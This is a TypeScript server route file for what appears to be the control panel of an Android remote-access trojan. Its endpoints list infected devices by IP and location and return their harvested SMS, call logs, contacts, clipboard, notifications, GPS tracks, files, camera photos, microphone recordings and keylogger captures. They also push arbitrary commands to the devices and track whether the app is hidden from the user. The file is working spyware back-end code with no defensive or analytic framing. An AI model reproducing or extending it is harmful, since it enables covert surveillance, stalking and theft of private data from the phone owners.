import type { FastifyInstance } from 'fastify';
import { getDb, dbHelpers } from '../db/index.js';
import { clients } from '../db/schema.js';
import type { clients as ClientsTable } from '../db/schema.js';
import { eq, desc } from 'drizzle-orm';
import { socketService } from '../services/socket.js';
import { CMD, type CmdType } from '../types/index.js';
import { normalizePermissions, normalizeDeviceInfo, normalizeFileList } from '../utils/helpers.js';
import { requirePermission, getRequestUser } from '../middleware/auth.js';
import type { Permission } from '../types/index.js';

const PAGE_PERMISSIONS: Record<string, Permission> = {
  info: 'device:view',
  sms: 'device:sms',
  calls: 'device:calls',
  contacts: 'device:contacts',
  gps: 'device:gps',
  camera: 'device:camera',
  mic: 'device:mic',
  files: 'device:files',
  wifi: 'device:wifi',
  clipboard: 'device:clipboard',
  notifications: 'device:notifications',
  permissions: 'device:permissions',
  apps: 'device:apps',
  fason: 'device:fason',
  screen: 'device:screen',
  keylogger: 'device:keylogger',
  downloads: 'files:download',
};

export async function deviceRoutes(app: FastifyInstance) {
  app.get('/api/clients', {
    preHandler: [app.auth, requirePermission('device:view')],
  }, async () => {
    const d = getDb();
    const allClients = d.select().from(clients).orderBy(desc(clients.online), desc(clients.lastSeen)).all();

    const formatted = allClients.map(formatClient);

    return {
      success: true,
      data: {
        clients: formatted,
        online: formatted.filter(c => c.online).length,
        offline: formatted.filter(c => !c.online).length,
        total: formatted.length,
      },
    };
  });

  app.get('/api/client/:id', {
    preHandler: [app.auth, requirePermission('device:view')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const d = getDb();
    const client = d.select().from(clients).where(eq(clients.id, id)).get();
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    return { success: true, data: formatClient(client) };
  });

  app.get('/api/client/:id/:page', {
    preHandler: [app.auth],
  }, async (request, reply) => {
    const { id, page } = request.params as { id: string; page: string };

    const requiredPermission = PAGE_PERMISSIONS[page];
    if (!requiredPermission) {
      return reply.code(400).send({ success: false, error: `Unknown page: ${page}` });
    }
    const user = getRequestUser(request);
    if (!user?.permissions || !user.permissions.includes(requiredPermission)) {
      return reply.code(403).send({ success: false, error: 'Insufficient permissions' });
    }

    const d = getDb();
    const client = d.select().from(clients).where(eq(clients.id, id)).get();
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    const data = getPageData(id, page, client);
    return { success: true, data };
  });

  app.delete('/api/client/:id', {
    preHandler: [app.auth, requirePermission('device:delete')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };

    socketService.disconnectClient(id);
    socketService.setGps(id, 0);

    const d = getDb();
    d.delete(clients).where(eq(clients.id, id)).run();

    dbHelpers.addLog('INFO', 'CLIENT', `Client ${id} deleted`);
    return { success: true, message: 'Client deleted' };
  });

  app.post('/api/cmd/:id/:cmd', {
    preHandler: [app.auth, requirePermission('device:command')],
  }, async (request, reply) => {
    const { id, cmd } = request.params as { id: string; cmd: string };
    const params = (request.body || {}) as Record<string, unknown>;

    const cmdType = cmd as CmdType;
    if (!Object.values(CMD).includes(cmdType)) {
      return reply.code(400).send({ success: false, error: 'Invalid command' });
    }

    const sent = socketService.send(id, cmdType, params);
    return { success: true, sent, queued: !sent };
  });

  app.post('/api/gps/:id/:interval', {
    preHandler: [app.auth, requirePermission('device:gps')],
  }, async (request, reply) => {
    const { id, interval } = request.params as { id: string; interval: string };
    const intervalNum = parseInt(interval, 10);

    if (isNaN(intervalNum) || intervalNum < 0 || intervalNum > 3600) {
      return reply.code(400).send({ success: false, error: 'Interval must be between 0 and 3600 seconds' });
    }

    socketService.setGps(id, intervalNum);
    return { success: true, interval: intervalNum };
  });
}

function safeJsonParse(str: string, fallback: any = []): any {
  try { return JSON.parse(str); } catch { return fallback; }
}

function getPageData(id: string, page: string, client: any) {
  switch (page) {
    case 'info': {
      const rawInfo = client.deviceInfo ? safeJsonParse(client.deviceInfo, null) : null;
      const deviceInfo = rawInfo ? normalizeDeviceInfo(rawInfo) : null;
      return { client: formatClient(client), deviceInfo };
    }
    case 'sms': {
      const smsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'sms'));
      return { list: Array.isArray(smsData) ? smsData : [] };
    }
    case 'calls': {
      const callsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'calls'));
      return { list: Array.isArray(callsData) ? callsData : [] };
    }
    case 'contacts': {
      const contactsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'contacts'));
      return { list: Array.isArray(contactsData) ? contactsData : [] };
    }
    case 'wifi': {
      const wifiData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'wifi'));
      return { list: Array.isArray(wifiData) ? wifiData : [], error: wifiData?.error || null };
    }
    case 'clipboard': {
      const clipData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'clipboard'));
      return { list: Array.isArray(clipData) ? clipData : [] };
    }
    case 'notifications': {
      const notifData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'notifications'));
      const notifStatus = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'notification_status'), null);
      return {
        list: Array.isArray(notifData) ? notifData : [],
        status: notifStatus || null,
      };
    }
    case 'permissions': {
      const rawPerms = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'permissions'));
      return { list: normalizePermissions(rawPerms) };
    }
    case 'apps': {
      const appsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'apps'));
      return { list: Array.isArray(appsData) ? appsData : [] };
    }
    case 'gps': {
      const gpsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'gps'));
      const gpsError = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'gps_error'), null);
      return {
        list: Array.isArray(gpsData) ? gpsData : [],
        interval: client.gpsInterval,
        error: gpsError?.error || null,
      };
    }
    case 'files': {
      const rawFiles = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'files'));
      const fileList = Array.isArray(rawFiles) ? normalizeFileList(rawFiles) : [];
      const fileError = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'file_error'), null);
      return { list: fileList, path: client.currentPath, error: fileError?.error || null };
    }
    case 'downloads': {
      const files = dbHelpers.getClientFiles(id, 'download');
      return { list: files };
    }
    case 'camera': {
      const rawCameras = dbHelpers.getOrCreateClientData(id, 'cameras');
      const cameras = safeJsonParse(rawCameras);
      const photos = dbHelpers.getClientFiles(id, 'photo');
      // Only report permission if cameras were actually detected (rawCameras !== '[]' means device responded)
      const camerasDetected = rawCameras !== '[]';
      return { cameras: cameras || [], photos, permission: camerasDetected ? client.cameraPermission : null };
    }
    case 'mic': {
      const recordings = dbHelpers.getClientFiles(id, 'recording');
      const micStatus = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'mic_status'));
      return { list: recordings, status: micStatus || null };
    }
    case 'fason':
      return { hidden: client.fasonHidden };
    case 'keylogger': {
      const raw = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'keylogger'));
      return { list: Array.isArray(raw) ? raw : [] };
    }
    case 'screen':
      return {};  // Screen data is streamed via Socket.IO, not stored in DB
    default:
      return { client: formatClient(client) };
  }
}

type ClientRow = typeof ClientsTable.$inferSelect;
export function formatClient(client: ClientRow) {
  return {
    id: client.id,
    ip: client.ip,
    country: client.country,
    city: client.city,
    timezone: client.timezone,
    deviceModel: client.deviceModel,
    deviceBrand: client.deviceBrand,
    deviceVersion: client.deviceVersion,
    online: !!client.online,
    firstSeen: client.firstSeen,
    lastSeen: client.lastSeen,
    reconnectCount: client.reconnectCount,
    fasonHidden: !!client.fasonHidden,
    cameraPermission: !!client.cameraPermission,
    currentPath: client.currentPath,
    gpsInterval: client.gpsInterval,
  };
}
